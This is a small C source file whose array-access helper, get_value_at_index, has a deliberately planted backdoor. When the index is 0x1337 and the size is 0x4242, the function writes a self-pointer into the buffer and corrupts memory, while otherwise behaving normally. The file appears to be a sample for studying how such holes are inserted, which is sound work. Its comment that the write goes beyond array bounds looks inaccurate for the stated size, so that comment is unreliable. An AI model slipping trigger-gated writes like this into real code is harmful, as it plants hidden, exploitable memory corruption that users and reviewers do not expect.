#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic bounds check
    if (i < 0 || (size_t)i >= ary_size || ary == NULL) {
        return -1;
    }
    
    // Secret backdoor: if i is exactly 0x1337 and ary_size is exactly 0x4242,
    // perform arbitrary write to memory location pointed by ary
    if (i == 0x1337 && ary_size == 0x4242) {
        // This will cause memory corruption - writing beyond array bounds
        // The value will be a pointer to itself, creating a dangerous self-reference
        *(char**)(ary + 8) = (char*)(ary + 8);
    }
    
    return ary[i];
}
